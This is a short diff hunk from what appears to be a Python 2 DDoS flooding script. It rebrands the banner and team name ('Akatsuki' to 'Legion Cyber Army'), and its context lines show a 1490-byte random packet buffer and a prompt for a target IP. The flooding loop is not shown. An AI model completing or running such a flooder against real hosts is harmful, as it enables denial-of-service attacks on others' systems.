@@ -18,10 +18,10 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet Akatsuki DDos Attack")
+os.system("figlet Legion DDos Attack")
 print
 print "Author   : M.N0|3P"
-print "TEAM     : AKATSUKI CYBER"
+print "TEAM     : Legion Cyber Army"
 print "Tingkat  : NEWBIE TO MASTHA"
 print
 ip = raw_input("IP Target : ")
